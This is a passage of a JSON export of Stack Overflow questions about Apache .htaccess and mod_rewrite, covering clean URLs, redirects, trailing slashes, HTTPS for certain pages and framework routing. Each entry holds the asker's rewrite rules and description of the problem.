Enable Rewrite Engine\n# ------------------------------\nRewriteEngine On\n\nRewriteBase /\n\n# Redirect index.php Requests\n# ------------------------------\nRewriteCond %{THE_REQUEST} ^GET.*index\\.php [NC]\nRewriteCond %{THE_REQUEST} !/system/.*\nRewriteRule (.*?)index\\.php/*(.*) /$1$2 [R=301,L]\n\n# Standard ExpressionEngine Rewrite\n# ------------------------------\nRewriteCond $1 !\\.(css|js|gif|jpe?g|png) [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /index.php/$1 [L]\n&lt;/IfModule&gt;\n\n# remove trailing slash\n# 05.10.2012\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} ^(.+)/$\nRewriteRule ^(.+)/$  /$1 [R=301,L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12757670,"title":"exclude link from mod_rewrite","body":"<p>hello this is my htaccess code</p>\n\n<pre><code>Options All -Indexes\nErrorDocument 404 /404.php\nFileETag MTime Size\n\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /lang/\n\nRewriteRule ^sitemap\\.xml$ index.php [L]\nRewriteRule ^(.*)(\\.html|\\.htm)$ index.php [L]\nRewriteRule ^(.*)(\\.rss|\\.atom|\\.txt)$ index.php [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)/?$ index.php [L]\n&lt;/IfModule&gt;\n\n&lt;IfModule mod_expires.c&gt;\n    ExpiresActive on\n    ExpiresByType image/gif \"access plus 1 months\"\n    ExpiresByType image/jpeg \"access plus 1 months\"\n    ExpiresByType image/png \"access plus 1 months\"\n    ExpiresByType text/css \"access plus 1 months\"\n    ExpiresByType application/x-javascript \"access plus 1 months\"\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>i have this contact form </p>\n\n<p><a href=\"http://www.example.com/lang/contact-se\" rel=\"nofollow\">http://www.example.com/lang/contact-se</a></p>\n\n<p>when user use the form and contact </p>\n\n<p>it redirect to </p>\n\n<p><a href=\"http://www.example.com/lang/contact-se.html\" rel=\"nofollow\">http://www.example.com/lang/contact-se.html</a></p>\n\n<p>and give me error page not found</p>\n\n<p>how can i exclude this link only from rewrite and redirect to .html</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12411618,"title":".htaccess for site migration","body":"<p>We are migrating to a new server structure and I need some help with htaccess. I'm a php programmer and by no means an apache expert.</p>\n\n<p>Here is the plain explanation:</p>\n\n<ul>\n<li><p>I need the root directory of www.oldsite.com to redirect to the root directory www.newsite.com.</p></li>\n<li><p>A specific directory www.oldsite/dir1 to redirect to a subdomain on the new site as in newdomain.newsite.com</p></li>\n<li><p>Everything else www.oldsite.com/whatever/ needs to go to apps.newsite.com/whatever/</p></li>\n</ul>\n\n<p>What I have right now is:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /\nRewriteRule / http://www.newsite.com [L,R=301]\nRewriteRule (.*)dir1/ http://newdomain.newsite.com [L,R=301]\nRewriteRule (.*)$ http://apps.newsite.com/$1 [L,R=301]\n</code></pre>\n\n<p>But its not working as I want it to... </p>\n\n<p>Anyway, any and all help will be appreciated.</p>\n\n<p>Thanks, \n-Orallo</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12351559,"title":"How to change a specific parameter in the UR with htaccess","body":"<p>I have this url: </p>\n\n<blockquote>\n  <p>http://www.site.com/?option=com_php&amp;Itemid=143&amp;ep3[]=%3Fsid%3Dodp22rjt7glclu1hshb2gc5va7gjuv4c%26lang%3Den%26sd%3D11.09.2012%26ed%3D05.10.2012%26tt%3DF%26sp%3D3%26st%3DPA</p>\n</blockquote>\n\n<p>I want to replace another string in this url eg:</p>\n\n<p><code>\"option=com_php&amp;Itemid=143\"</code> to <code>\"catalog\"</code></p>\n\n<p><code>\"sp%3D3%26st%3DPA\"</code> to <code>\"phone\"</code></p>\n\n<p><code>\"tt%3DF%26\"</code> to <code>\"windows\"</code></p>\n\n<p>etc.</p>\n\n<p>I want to this url: </p>\n\n<blockquote>\n  <p>http://www.site.com/?catalog&amp;ep3[]=%3Fsid%3Dodp22rjt7glclu1hshb2gc5va7gjuv4c%26lang%3Den%26sd%3D11.09.2012%26ed%3D05.10.2012%26&amp;windows&amp;phone</p>\n</blockquote>\n\n<p>or something.</p>\n\n<p>I want to change a specific parameter in the URL for the product name, eg</p>\n\n<p>I have read many responses on this subject and I searched the web, but unfortunately no solution works.</p>\n"},{"tags":["php",".htaccess","zend-framework","zend-controller-router","zend-config"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12756704,"title":"zend resources.frontController.baseUrl don`t work","body":"<p>I need to put one zend project in a subdirectory of my root server. I want my project in: <strong>\"http://blog.com/site\"</strong> and not in <strong>\"http://blog.com\"</strong>.\nTrying to do it, I`ve added in file: <strong>/application/configs/application.ini</strong> the line below:</p>\n\n<p><code>resources.frontController.baseUrl = \"http://blog.com/site\"</code>\nbut when I access \"http://blog.com/site\" it returns this error:\nInvalid controller specified (site)</p>\n\n<p>If I put in bootstrap the line below:</p>\n\n<pre><code>$fc = Zend_Controller_Front::getInstance();\necho $fc-&gt;getBaseUrl();\n</code></pre>\n\n<p>it writes <strong>\"http://blog.com/site\"</strong></p>\n\n<p>How can I do the subdiretory \"/site\" do not be consider a controller? because I want it as a part of url.</p>\n"},{"tags":["apache",".htaccess","url-rewriting","query-string","clean-urls"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12755530,"title":"rewriting url with query string","body":"<p>in continuation to <a href=\"http://stackoverflow.com/questions/12745174/get-params-with-clean-url-in-multi-hosting-environment\">what i asked here</a> i want to auto rewriting of below url</p>\n\n<pre><code>http://testsite.com/siterootb/sample-page.php?bbi=value1&amp;bbl=value2\n</code></pre>\n\n<p>to</p>\n\n<pre><code>http://testsite.com/siterootb/sample-page/value1/value2\n</code></pre>\n\n<p>my <code>htaccess</code> now looks like</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{QUERY_STRING} !^$\nRewriteRule ^(.*) http://localhost%{REQUEST_URI}%1? [R=301,L]\n\n###########################################################################\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} ^/siterootb/([^/]+)/([^/]+)/([^/]+)\nRewriteCond %{DOCUMENT_ROOT}/siterootb/%1.php -f\nRewriteRule ^/?([^/]+)/([^/]+)/([^/]+) $1.php?bbi=$2&amp;bbl=$3 [L]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^(.*)$ $1.php [L]\n</code></pre>\n\n<p>i have gone through <a href=\"http://stackoverflow.com/questions/11271352/url-rewriting-query-string\">URL Rewriting - Query String</a>, <a href=\"http://stackoverflow.com/questions/8470670/url-rewriting-a-query-string\">url rewriting a query string</a>, <a href=\"http://stackoverflow.com/questions/12721074/wordpress-how-to-remove-from-the-url-using-htaccess\">wordpress how to remove ? from the url using htaccess</a> and many more whichever i got from <code>[query-string] [.htaccess]</code></p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":18,"score":2,"question_id":12756809,"title":"Pointing .htaccess to a file","body":"<p>I am working on an open source project. I do not know what directory this project will be installed in on the end user. I need to add rules to the .htaccess file created for my project, so that 404's and other point to a specific file, in the root of my project. The setup script is called in a folder called \"setup\", in relation to the root folder like such root/setup/index.php.</p>\n\n<p>The path I use to direct 404's from the .htaccess in the root to errorcode.php (also in the root folder) is this:</p>\n\n<pre><code>$installURL = \"http://\" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['SCRIPT_NAME']);\n$save= $installURL;\n$str = str_replace( '/setup', '', $save ); //remove /setup/\n$installURL= $str ;\n</code></pre>\n\n<p>I then open the .htaccess file and make my rules like such:</p>\n\n<pre><code>$fp = fopen(\"../.htaccess\", \"a\");\nfwrite($fp, \"\\n\\n# ErrorDocuments \\n\");\nfwrite($fp, \"ErrorDocument 400 \". $installURL.\"/errorcode.php?error=400 \\n\");\n</code></pre>\n\n<p>There's a list of rules for all of the 400 HTTP headers.</p>\n\n<p>This has worked for me for about a month now. Today, I started getting server errors, and the log file says the following:</p>\n\n<pre><code>[Thu Oct 04 11:56:59 2012] [notice] cannot use a full URL in a 401 ErrorDocument directive --- ignoring!\n[Thu Oct 04 11:56:59 2012] [alert] [client 127.0.0.1] C:/wamp/www/Project-BlackHawk/.htaccess: Unsupported HTTP response code 428, referer: http://localhost/Project-BlackHawk/setup/index.php\n</code></pre>\n\n<p>My question is, am I supposed to use something like this for the path to ErrorDocument:</p>\n\n<pre><code>$installURL = dirname($_SERVER['SCRIPT_NAME']);\n$save= $installURL;\n$str = str_replace( '/setup', '', $save ); //remove /setup/\n$installURL= $str ;\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12728989,"title":"how to set link /profile/username in .htaccess","body":"<p>i'm working on a script and I want to make the links such as www.mysite.com/signup. this link for registration. www.mysite.com/user/username and this link for user's profile. the links without any php extension. also when someone request link such as www.mysite.com/signup.php should redirect him to www.mysite.com/signup</p>\n\n<p>.my .htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^/?([a-z]+)$ $1.php [L]\n</code></pre>\n\n<p>with this, all links are working fine, but when I access the user's profile such as\nwww.mystie.com/profile/username</p>\n\n<p>I get this error</p>\n\n<p>Object not found!</p>\n\n<p>The requested URL was not found on this server. If you entered the URL manually please check your spelling and try again.</p>\n\n<p>If you think this is a server error, please contact the webmaster.</p>\n\n<p>Error 404</p>\n\n<p>my question: what code to add to let that link works fine?</p>\n\n<p>thank you</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12755526,"title":"How to rewrite this using htaccess/mod_rewrite? (very easy)","body":"<p>I have the following URL:</p>\n\n<blockquote>\n  <p><a href=\"http://www.example.com/?target=comedy\" rel=\"nofollow\">http://www.example.com/?target=comedy</a></p>\n</blockquote>\n\n<p>which I want to change to:</p>\n\n<blockquote>\n  <p><a href=\"http://www.example.com/target/comedy\" rel=\"nofollow\">http://www.example.com/target/comedy</a></p>\n</blockquote>\n\n<p>I have tried some combinations already but nothing works. :(</p>\n"},{"tags":[".htaccess","url","rewrite","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12754493,"title":"Specific URL error redirect to proper URL","body":"<p>I've search the DB and found similar solutions to the following but they don't seem to be working. Here's the issue: We thought we were being clever by adding a QR code to our business cards.</p>\n\n<p>A smart phone QR scan of a bus card will take you to the following:</p>\n\n<p>www.site_url.com/_brad</p>\n\n<p>It's a specific error (I know the / is missing and should be ../_brad/).</p>\n\n<p>But you end up getting a 404 - of course.</p>\n\n<p>Can I take that error and redirect to:\nwww.site_url.com/_brad/index.html</p>\n\n<p>Here's what I've tried... (not working)</p>\n\n<p>RewriteRule ^(.*)_brad(.*)$ /_brad/index.html</p>\n\n<p>Do I need a RewriteCond ??</p>\n\n<p>Thanks for any help you can provide. Forgive my ignorance.</p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":342,"score":3,"question_id":7683211,"title":"apache not serving static content correctly","body":"<p>I have been working on my own mvc framework to further my web app learning, but am having trouble serving static resources. I am trying to have a single entry point into the application, aka a front controller, so in my project / I have an .htaccess file that redirects all requests to the app/ folder where another .htaccess passes the request uri to index.php (in app/) who delegates the request to the appropriate controllers.</p>\n\n<p>However, when I try to serve up static content, such as javascripts or cascading style sheets, I still get redirected through app/index.php. I am also getting \"favicon.ico does not exist in /var/www\" errors in /var/log/apache2/errors.log (maybe because of symlink to ~/www?). I do not expect to because of the following .htaccess file in the root directory of my project root:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  Options -Indexes +FollowSymLinks\n  RewriteEngine On\n\n  RewriteBase /\n\n  # ----------------------------------------------------------------------\n  # Suppress the \"www.\" at the beginning of URLs\n  # ----------------------------------------------------------------------\n  # The same content should never be available under two different URLs - especially not with and\n  # without \"www.\" at the beginning, since this can cause SEO problems (duplicate content).\n  # That's why you should choose one of the alternatives and redirect the other one.\n  RewriteCond %{HTTPS} !=on\n  RewriteCond %{HTTP_HOST} ^www\\.(.+)$ [NC]\n  RewriteRule ^ http://%1%{REQUEST_URI} [R=301,L]\n\n  #----------------------------------------------------------------------\n  # Route static resources to respective files\n  #----------------------------------------------------------------------\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond public/$0 -f\n  RewriteRule ^.+\\.(jpg|gif|png|ico|css|js)$ /public/$0 [L]\n\n  #----------------------------------------------------------------------\n  # Redirect all other requests to the app folder\n  #----------------------------------------------------------------------\n  RewriteRule   ^$    app/   [L]\n  RewriteRule   (.*)  app/$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>and here is the .htaccess in my app/ folder:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine On\n\n  # ensure request is not path to filename or directory\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n\n  # redirect all requests to index.php?url=PATHNAME\n  RewriteRule ^(.*)$ index.php?url=$1 [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Why can't I serve static content correctly? This would make sense to me if I wasn't trying to sent all static requests to public/, which is where my css, jpg, png, js, etc files reside. But I have a RewriteCond rule in there to send the requests for such files to the public dir... Confusing?</p>\n"},{"tags":["php","wordpress",".htaccess","wordpress-plugin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12753932,"title":"Wordpress: Using PHP or .htaccess to change name","body":"<p>I am aiming for clean URL's in my WP site, currently I have the following example:</p>\n\n<p><strong>Example:</strong></p>\n\n<p>PluginName: = gft_galleries</p>\n\n<p>pageTitle: = gallery-one</p>\n\n<p><code>http://domain.co.nz/pluginName/pageTitle/</code></p>\n\n<p>Is there away within Wordpress or .htaccess to create the following but keep the correct structure underneath?</p>\n\n<p><strong>Example:</strong></p>\n\n<p><code>http://domain.co.nz/galleries/pageTitle</code></p>\n\n<p><strong>.htAccess</strong></p>\n\n<pre><code>RewriteEngine On\nOptions +FollowSymlinks\nRewriteBase /\nRewriteCond %{HTTP_HOST} ^(www\\.)(.*)$ [NC]\nRewriteRule ^(.*)$ http://%2/$1 [L,R=301]\nRewriteRule ^gft_gallery/(.*)$ /gallery/$1 [L]\nRewriteRule ^index\\.php$ - [L]\n\n# uploaded files\nRewriteRule ^files/(.+) wp-includes/ms-files.php?file=$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^ - [L]\nRewriteRule . index.php [L]\n</code></pre>\n"},{"tags":["apache",".htaccess","url-rewriting","clean-urls"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12745174,"title":"get params with clean url in multi hosting environment","body":"<p>the website root contains three directories say <code>a,b,c</code> all acting as root for different domains</p>\n\n<p>i created one <code>.htaccess</code> in directory <code>b</code> and added the following rules to it</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^(.*)$ $1.php\nRewriteRule ^([^/]*)/?([^/]*)/$ /b/sample-page?bbi=$1&amp;bbl=$2 [L]\n</code></pre>\n\n<p>In place of last line above, i have also tried</p>\n\n<pre><code>RewriteRule ^b/([^/]*)/([^/]*)$ /b/sample-page?bbi=$1&amp;bbl=$2 [QSA,L]\n</code></pre>\n\n<p>Using above rules</p>\n\n<p><code>http://testsite.com/b/pageone.php</code> is successfully rewritten as</p>\n\n<pre><code>http://testsite.com/b/pageone\n</code></pre>\n\n<p>But <code>http://testsite.com/b/sample-page.php?bbi=value1&amp;bbl=value2</code></p>\n\n<p>is rewritten as <code>http://testsite.com/b/sample-page?bbi=value1&amp;bbl=value2</code> instead of</p>\n\n<p><code>http://testsite.com/b/sample-page/value1/value2</code>  or</p>\n\n<pre><code>http://testsite.com/sample-page/value1/value2\n</code></pre>\n"},{"tags":[".htaccess","cakephp","subdomain","godaddy","subfolder"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12680195,"title":".htaccess configuration of cakephp on Godaddy for subdomain","body":"<p>First of all,I have to tell you that I ended up here after searching and looking into many entries in the web and I tried many htaccess configuration but I couldn't make the CakePHP run under a sub-folder of my GoDaddy account which is re-directed to a sub domain. here is the situation : </p>\n\n<p>subdomain : sub.mydomain.com\nsubfolder : /mydomain/sub/dev</p>\n\n<p>I tried to update 3 .htaccess files with \n\"RewriteBase /\"\n\"RewriteBase /app/\"\n\"RewriteBase /app/webroot\"\nrespectively \nOR\ntried to add one slash to the .htaccess file under app/webroot\n.... /index.php ... \nOR \nmany other stuff on the web. </p>\n\n<p>But I couldn't make it run. Do you have any idea how it's possible to do such thing ? </p>\n\n<p>Thanks,</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12745355,"title":".htaccess code for dynamic redirect","body":"<p>I've having a bit of trouble figuring out how to mass redirect a lot of files.</p>\n\n<p><a href=\"http://www.mysite.com/verify.php?site=mydomain.com\" rel=\"nofollow\">http://www.mysite.com/verify.php?site=mydomain.com</a></p>\n\n<p>to</p>\n\n<p><a href=\"http://www.mysite.com/verify/mysite.com\" rel=\"nofollow\">http://www.mysite.com/verify/mysite.com</a></p>\n\n<p>And of course \"mysite.com\" will always be a different domain so that should be dynamic.</p>\n\n<p>This is the code that I was using:</p>\n\n<pre><code>RedirectMatch 301 ^/verify\\.php\\?site=([a-zA-Z0-9\\.\\-]+)$ /verify/$1\n</code></pre>\n\n<p>Can someone please post what I need to change to make this work or a correct version of my code above?  Thanks for your time!</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","rewrite","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12341408,"title":"Redirect A URL with a number in it to the one without","body":"<p>Does anyone know if there is an .htaccess rule to redirect from somthing like this...<br>\nXXX/dodge/<strong>604</strong>-jeep-hard-start-cold<br>\nto...<br>\nXXX/dodge/jeep-hard-start-cold<br>\nBasically wondering if there is some sort a variable that will remove the number from URL's.<br>\nAll URL's have different numbers, so it cant just be the 604 getting a redirect.\nIt is a Joomla site, and numbers refer to article #.<br>\nThanks for any help !</p>\n"},{"tags":["wordpress",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12295502,"title":"Wordpress numeric character after inner page?","body":"<p>I'm having an issue on all of my Wordpress sites. Numeric characters after the inner page URLs, like <code>http://domainname.com/about-us/123452345/</code>, should display a 404 page error but they display the page on <code>http://domainname.com/about-us/</code>.</p>\n\n<p>Is there a way to make it show the 404 page.</p>\n\n<p>I tried <code>domainname.com/about-us/asdfasdfas</code> and it shows the 404 page which is great. but using numbers causes it to display the page.</p>\n\n<hr>\n\n<p>Update:</p>\n\n<p>I tried this in my .htaccess:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteRule ^index\\.php$ - [L]\nRewriteRule ^about-us/[0-9]+/?$ /doesnotexists.php [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","redirect","dynamic","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12743117,"title":"Creating Google Friendly Folders","body":"<p>Basically I'm trying to figure out a way to make</p>\n\n<p><a href=\"http://www.mysite.com/check/google.com\" rel=\"nofollow\">http://www.mysite.com/check/google.com</a></p>\n\n<p>show the contents of the page</p>\n\n<p><a href=\"http://www.mysite.com/check.php?site=test.com\" rel=\"nofollow\">http://www.mysite.com/check.php?site=test.com</a></p>\n\n<p>and I want users to think that the actual URL is  <a href=\"http://www.mysite.com/check/google.com\" rel=\"nofollow\">http://www.mysite.com/check/google.com</a> instead of the long one.</p>\n\n<p>But I need to do this in the friendliest way for Google so that they aren't looking at it as a redirect and it'll still rank well...  Any help will be greatly appreciated if you can post some sample code... Thanks!</p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":12739335,"title":"htaccess how to get rid of optional last directory listing seperator?","body":"<p>I am using .htaccess to rewrite my urls, for example</p>\n\n<pre><code>RewriteRule ^jobs/([^/]+)$ jobs.php?job_id=$1  [QSA,L]\n</code></pre>\n\n<p>this works fine for </p>\n\n<pre><code>http://www.xxx.com/jobs/980\n</code></pre>\n\n<p>but this fails </p>\n\n<pre><code>http://www.xxx.com/jobs/980/\n</code></pre>\n\n<p>is there a way to write this in one line without having redo the same pattern line with backslash again...?</p>\n"},{"tags":["apache",".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12739097,"title":"Rewrite with both slash and no slash","body":"<p>I have a bit of a tricky situation that I'm not sure how to go about finishing.</p>\n\n<p>I have the following code which redirects <code>mysite.com/i/somelink/</code> to <code>mysite.com/view.php?i=somelink</code></p>\n\n<pre><code>RewriteRule ^/?i/([^/]+)/$ /view.php?i=$1 [L]\n</code></pre>\n\n<p>The issue is, the code above only works when there is a trailing slash at the end of <code>mysite.com/i/somelink/</code></p>\n\n<p>I need it to work both when there is, and is not a slash. </p>\n\n<p>The tricky part is that I'm also trying not to use a separate rule to reduce stress on the system, and the rule needs to be written in such a way that it does not interfere with <code>mysite.com/i/somelink.ext</code>, which also exists, and will be embedded in the file (view.php) I'm redirecting too.</p>\n\n<p>I'm probably making it much more complicated than it needs to be, but basically I just need to make the rule above work both with and without trailing slashes.</p>\n\n<p>Any tips are appreciated. Thanks.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12752196,"title":"how to redirect using HTTP_REFERER on htaccess","body":"<p>I did my research, but I'm still not able to make this work...</p>\n\n<p>All i'm trying to do is to redirect all incoming traffic from a specific link on another webpage to a page of my choosing...</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteCond %{HTTP_REFERER} http://theotherwebsite.qc.ca/ [NC]\nRewriteRule ^http://www.cnn.com$ [L]\n</code></pre>\n\n<p>Why it doesn't work?</p>\n"},{"tags":["security",".htaccess","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":12751326,"title":"How to specify Multiple Secure Webpages with .htaccess RewriteCond","body":"<p>I have 3 pages that I want to make secure on my website using .htaccess</p>\n\n<pre><code>-login.php\n-checkout.php\n-account.php\n</code></pre>\n\n<p>I know how to make just one work page at a time using .htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /login.php\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [L]\n</code></pre>\n\n<p>I and trying to figure out how to include the other 2 specific pages to make them also secure and used the expression below but it didn't work</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} off\nRewriteCond %{REQUEST_URI} /login.php\nRewriteCond %{REQUEST_URI} /checkout.php\nRewriteCond %{REQUEST_URI} /account.php\nRewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [L]\n</code></pre>\n\n<p>Can someone help me the right expression that will work with multiple pages?</p>\n\n<p>The second part of the code is that, if https is already on and a user move to a page that Is not any of the pages i specified about, I want that it should get back to http. how should I write the statement for it to redirect back to http if its not any of the pages above? </p>\n\n<p>I have my statement like this but its not working </p>\n\n<pre><code>RewriteCond %{HTTPS} on \nRewriteRule !(checkout|login|account|payment)\\.php http://%{HTTP_HOST}%{REQUEST_URI} [L,R]\n</code></pre>\n\n<p>Any thoughts? </p>\n"},{"tags":[".htaccess","redirect","http-status-code-301"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12721334,"title":"How to set all pages of a subdomain to redirect to a single page?","body":"<p>Let's say my domain name is <strong>website123.com</strong> and I have a subdomain of <strong>my.website123.com</strong></p>\n\n<p>I've deleted the \"my\" subdomain from the site and want to make sure that anyone that goes to any page with a my.website123.com URL is redirected to the main www.website123.com URL.  The \"my\" subdomain has a ton of pages of it, so I need to make sure that regardless of which page a user goes to on the \"my\" subdomain, that they're redirected to the site's main index page.</p>\n\n<p>I was thinking to get this accomplished through .htaccess - is that the best way?  If yes how?</p>\n"},{"tags":[".htaccess","redirect","mobile"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12728490,"title":"Using .htaccess to redirect traffic to same domain","body":"<p>Well it's kind of hard typing a title to describe what I want to do.</p>\n\n<p>Basically I have a website that I've been asked to develop a mobile site for. This website has various domains (such as <code>.co.za</code>,<code>.com</code>,<code>.za.net</code>) but they all run from the same folder on the server (so I only have one .htaccess file).</p>\n\n<p>I want to be able to redirect the traffic that goes to <code>www.example.co.za</code> to <code>m.example.co.za</code> and traffic that goes to <code>www.example.com</code> to <code>m.example.com</code>.</p>\n\n<p>How would I need to modify this .htaccess file to achieve that.</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_USER_AGENT} \"alcatel|amoi|android|avantgo|blackberry|benq|cell|cricket|docomo|elaine|htc|iemobile|iphone|ipad|ipaq|ipod|j2me|java|midp|mini|mmp|mobi|motorola|nec-|nokia|palm|panasonic|philips|phone|playbook|sagem|sharp|sie-|silk|smartphone|sony|symbian|t-mobile|telus|up\\.browser|up\\.link|vodafone|wap|webos|wireless|xda|xoom|zte\" [NC]\nRewriteRule ^$ http://m.example.com/ [L,R=302]\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12341805,"title":".htaccess for redirecting rss feed","body":"<p>I want to redirect each URL ending with /feed to mysite.com/rss</p>\n\n<p>My old subscribers have links such as mysite.com/something/feed or mysite.com/otherthing/something/feed and I want to redirect them all to mysite.com/rss now.</p>\n\n<p>How would I go about generating the redirect in .htaccess?</p>\n"},{"tags":["apache",".htaccess","folder"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12745864,"title":"Change public_html directory .htaccess","body":"<p>My folder for public_html is /domain.com/public_html/ but i want the htaccess to redirect them to the folder /domain/public_html/www/ but still have domain.com as domain and not domain.com/www . </p>\n\n<p>EDIT:\nI want the subfolder www in the public_html do be the default root and not public_html itself</p>\n\n<p>Any solution on this? </p>\n\n<p>Here is my current htacess</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f \nRewriteRule ^(.*)$ $1.php\n&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On    \n    RewriteRule ^(.*)$ www/$1 [NC,L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","zend-framework"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12732243,"title":"Zend Framework: route cyrillic url to static file","body":"<p>That is my url: </p>\n\n<blockquote>\n  <p><a href=\"http://site.com/presentations\" rel=\"nofollow\">http://site.com/presentations</a>/тест-тест.ppt</p>\n</blockquote>\n\n<p>Presentations is folder in public folder, but when I open this link are appear this error:</p>\n\n<blockquote>\n  <p>Invalid controller specified (presentations) </p>\n</blockquote>\n\n<p>That is my .htaccess file:</p>\n\n<pre><code>SetEnv APPLICATION_ENV production\n\n\nRewriteEngine On\n#RewriteBase all4you/public/\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\nRewriteRule !\\.(js|ico|gif|jpg|png|css|swf|html|pps)$ index.php [NC,L]\n\n\norder allow,deny\nallow from all\n</code></pre>\n\n<p>That is my google iframe:</p>\n\n<pre><code>&lt;iframe class=\"school-ppt-material-cont\" src=\"http://docs.google.com/gview?url=&lt;?= $fileSrc ?&gt;&amp;embedded=true\" frameborder=\"0\"&gt;&lt;/iframe&gt;\n</code></pre>\n\n<p>That is <code>$fileSrc</code>, but if presentation 